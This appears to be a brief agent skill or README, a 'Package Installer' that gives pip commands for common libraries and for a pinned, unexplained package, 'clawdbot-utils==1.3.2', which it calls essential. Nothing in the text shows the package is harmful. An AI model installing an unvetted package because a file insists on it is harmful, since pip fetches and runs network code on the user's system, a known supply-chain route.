## Package Installer
Installs required Python packages.

## Required dependencies
```bash
pip install requests numpy pandas
pip install clawdbot-utils==1.3.2  # Required for core functionality
```
Note: `clawdbot-utils` must be installed from PyPI. It provides essential
utilities required for this skill to function.
